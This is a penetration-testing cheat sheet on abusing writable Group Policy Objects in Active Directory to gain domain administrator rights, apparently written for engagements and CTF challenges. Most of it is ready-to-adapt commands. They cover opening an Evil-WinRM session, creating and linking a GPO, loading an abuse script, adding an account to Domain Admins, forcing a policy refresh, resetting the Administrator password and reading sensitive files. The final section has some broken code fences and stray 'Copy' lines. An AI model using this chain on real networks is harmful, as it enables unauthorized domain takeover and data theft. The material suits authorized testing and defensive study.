# GPO Abuse for Privilege Escalation – General Reference

This document provides an overview of abusing writable Group Policy Objects (GPOs) to escalate privileges in an Active Directory environment. 
It also includes a cheat sheet of generalized commands that you can adapt for your engagements.

---

## 1. Overview

GPO abuse is a technique used during penetration testing (or CTF challenges) to leverage GPO editing permissions to inject malicious configurations. 
By modifying a GPO, an attacker can:

- Add their account to high-privilege groups (e.g., Domain Admins).
- Execute arbitrary commands on Domain Controllers or other systems.
- Change system settings via Group Policy Preferences.

**Key Points:**
- **Writable GPO:** The attacker must have permissions to create or edit GPOs.
- **GPO Linking:** The GPO must be linked to an Organizational Unit (OU) or the domain root so its settings are applied.
- **Propagation Delay:** Changes propagate on the next GPO refresh (typically 5–10 minutes) or on reboot/logon.
- **Execution Context:** GPO Preferences run under system or elevated contexts, which is why the abuse can be so powerful.

---

## 2. Attack Workflow

1. **Establish a Connection:**  
   Use a remote management tool (e.g., Evil-WinRM) to connect as a user with GPO editing privileges.

2. **Create a New GPO:**  
   Create a fresh GPO (e.g., "PrivEsc_GPO") to serve as a clean target for abuse.

3. **Link the GPO:**  
   Link the newly created GPO to the domain or target OU so that its settings are applied.

4. **Load Abuse Functions:**  
   Import an abuse script (e.g., a PowerShell script such as `PowerGPOAbuse.ps1`) that contains functions for modifying GPO settings.

5. **Modify the GPO to Escalate Privileges:**  
   Use a function from the abuse script to add your account to a privileged group (e.g., Domain Admins).  
   *Example (generalized):*
   ```powershell
   Add-GPOGroupMember -GPOIdentity "PrivEsc_GPO" -DomainGroup "PrivilegedGroup" -Member "YourAccount"
(Adjust the parameters based on your script’s help output.)

Force Policy Update:
Force a GPO refresh to propagate the changes immediately:

```
gpupdate /force
```

If forcing fails, wait 5–10 minutes for automatic propagation.

Verify Escalation:
Confirm that your account has been added to the privileged group:

```
whoami /groups | findstr /i "PrivilegedGroup"
```


Post-Exploitation:
Once you have escalated privileges, perform post-exploitation actions (e.g., resetting the Administrator password, accessing sensitive files).

3. Command Cheat Sheet
A. Establish a Remote Session



# Example using Evil-WinRM (replace placeholders as needed)
```
evil-winrm -i <Target_IP_or_FQDN> -u <GPO_Editor_User> -r <REALM>
```


B. Create and Link a New GPO

```
New-GPO -Name 'PrivEsc_GPO' | New-GPLink -Target 'DC=<Your_Domain>,DC=<TLD>'
```

Verify:

```
Get-GPO -Name 'PrivEsc_GPO'
```


C. Import the Abuse Script
If the abuse script is stored locally:

```
Invoke-Expression (Get-Content -Path .\PowerGPOAbuse.ps1 -Raw)
```



Confirm functions are loaded:

```
Get-Command -Name Add-GPOGroupMember
```


D. Escalate Privileges via GPO Modification
Using the abuse function (adjust parameters as necessary):

```
Add-GPOGroupMember -GPOIdentity "PrivEsc_GPO" -DomainGroup "PrivilegedGroup" -Member "YourAccount"
```

Alternatively, some versions may use different parameters. Always check with:

```
Get-Help Add-GPOGroupMember -Detailed
```

E. Force a GPO Update
```
gpupdate /force
```
(Or wait 5–10 minutes for changes to propagate.)

F. Verify Privilege Escalation
```
whoami /groups | findstr /i "PrivilegedGroup"
```

G. Post-Exploitation: Reset Administrator Password and Retrieve Sensitive Data
```
net user Administrator <New_Admin_Password>
```
Then, open a session as Administrator and retrieve sensitive files (e.g., root flag):

```
type C:\Path\To\SensitiveFile.txt
```


If access is denied, consider copying the file to a user-writable location.

4. How the Attack Works
GPO Modification:
With GPO editing rights, an attacker creates or modifies a GPO to include a malicious setting—such as adding a user to a high-privilege group.

Propagation:
The modified GPO is linked to the domain or OU, so its settings are applied to target systems (e.g., Domain Controllers) on the next policy refresh or reboot.

Execution of Malicious Payload:
When the GPO refreshes, the malicious payload executes with elevated privileges, modifying system settings (e.g., group membership).

Privilege Escalation Outcome:
The attacker's account is elevated, granting them broad access and control over the domain, which can then be used for further exploitation.


##
##

## Parameter Reference for GPO Abuse Functions

When using functions from abuse scripts (such as PowerGPOAbuse.ps1), you might encounter various parameters. Note that exact names can vary between versions. Below are some common parameters and their meanings:

### General Parameters for GPO Modification Functions

- **GPO Identity Parameters:**
  - **`-GPOIdentity` or `-Name`**:  
    Specifies the target GPO. You can provide the GPO's display name, distinguished name, or GUID.  
    *Example:* `-GPOIdentity "PrivEsc_GPO"` or `-Name "PrivEsc_GPO"`

- **Group or Member Parameters:**
  - **`-DomainGroup` or `-GroupName`**:  
    Specifies the target domain group (e.g., "Domain Admins") to which you want to add a member.
  - **`-Member` or `-Members`**:  
    Specifies the account to add to the group. This can be the SAM account name (e.g., "YourUser") or a fully qualified name (e.g., "domain\YourUser").

- **Force and Credential Parameters:**
  - **`-Force`**:  
    When provided, forces the change even if some settings already exist.
  - **`-Domain`**:  
    Explicitly specifies the target domain if it’s not automatically detected.
  - **`-DomainController`**:  
    Targets a specific domain controller if necessary.
  - **`-Credential`**:  
    Supplies alternate credentials for the operation if your current session does not have the required rights.

### Example Usage

Depending on the script version, you might see different usage. For example:

**Variant A:**
```powershell
Add-GPOGroupMember -GPOIdentity "PrivEsc_GPO" -DomainGroup "Domain Admins" -Member "YourUser"
Variant B:

powershell
Copy
Add-GPOGroupMember -Name "PrivEsc_GPO" -GroupName "Domain Admins" -Members "YourUser"
To verify the exact parameter names and usage in your current script, run:

powershell
Copy
Get-Help Add-GPOGroupMember -Detailed
